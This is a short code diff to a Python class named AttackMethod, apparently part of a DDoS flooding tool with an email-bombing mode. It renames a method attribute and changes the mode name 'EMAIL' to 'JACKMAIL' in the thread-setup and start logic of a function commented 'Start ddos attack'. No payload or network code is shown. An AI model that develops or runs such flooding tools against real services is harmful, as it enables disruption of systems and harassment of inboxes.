@@ -72,7 +72,7 @@ class AttackMethod:
     # Run flooder
     def __RunFlood(self):
         while self.is_running:
-            self.method(self.target)
+            self.way(self.target)
 
     # Start threads
     def __RunThreads(self):
@@ -80,7 +80,7 @@ class AttackMethod:
         thread = Thread(target=self.__RunTimer)
         thread.start()
         # Check if 1 thread
-        if self.name == "EMAIL":
+        if self.name == "JACKMAIL":
             self.threads_count = 1
         # Create flood threads
         for _ in range(self.threads_count):
@@ -105,7 +105,7 @@ class AttackMethod:
 
     # Start ddos attack
     def Start(self):
-        if self.name == "EMAIL":
+        if self.name == "JACKMAIL":
             target = self.target_name
         else:
             target = str(self.target).strip(
